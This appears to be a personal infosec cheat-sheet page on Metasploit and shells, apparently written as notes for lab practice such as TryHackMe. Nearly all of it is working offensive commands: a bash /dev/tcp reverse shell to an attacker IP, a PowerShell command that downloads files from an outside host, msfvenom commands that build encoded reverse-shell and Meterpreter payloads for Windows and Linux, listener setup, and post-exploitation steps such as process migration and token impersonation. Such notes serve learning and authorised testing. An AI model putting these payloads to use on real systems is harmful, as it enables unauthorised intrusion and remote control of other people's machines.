---
layout: single
classes: #wide
title: "Metasploit & Shells"
sidebar:
    title: "Metasploit"
    nav: infosec
collection: infopages
permalink: /infosec/metasploit/
toc: true
toc_sticky: true
author_profile: true
---

# Shells
reverse shell tips:  
```rlwrap nc -lnvpn``` (reverse shell with better fuctionality/arrowkeys)  

after get shell:  
```python3 -c 'import pty;pty.spawn("/bin/bash")'```
```ctrl - z```(to background the nc process)  
```stty raw -echo;fg```
```export TERM=xterm```   
* makes able to clear term
* better machine access

bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1

## Post shells
Uploading files: 
`powershell -c "curl 9.13.53.1:9999/$file -OutFile $file"`

# Commands
* `migrate <pid>`
 
# Meterpreter

## Windows
`load powershell` - loads into meterpreter  
`powershell_shell`  
`shell`  

## Modules
incognito - allows user token impersonation  
- just because have high level token doesn't mean you have perms of high level token

# Msfconsole
`sessions -i <session num>` - attach session   
`sessions -u <session num>` - upgrade to meterpreter

## Shells 
windows:  
ex msfvenom reverse shell:  
`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`
ex msfconsole listener:  
`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`

Linux:  
ex msfvenom:  
`msfvenom -p cmd/linux/http/x86/shell/reverse_tcp --encoder x86/shikata_ga_nai LHOST=10.13.53.1 LPORT=8888 -f sh -o upgrades.sh` 
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.13.53.1 LPORT=8888 -f elf > reverse.elf `
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > meterpreter.elf`
ex msfconsole: 
`use exploit/multi/handler set PAYLOAD cmd/linux/http/x86/shell/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`
`use exploit/multi/handler set PAYLOAD /linux/x86/shell_reverse_tcp set LHOST <ip> LPORT 8888 run`
## Meterpreter
`channel -i <session>` - attaches
`upload <file>` - uploads file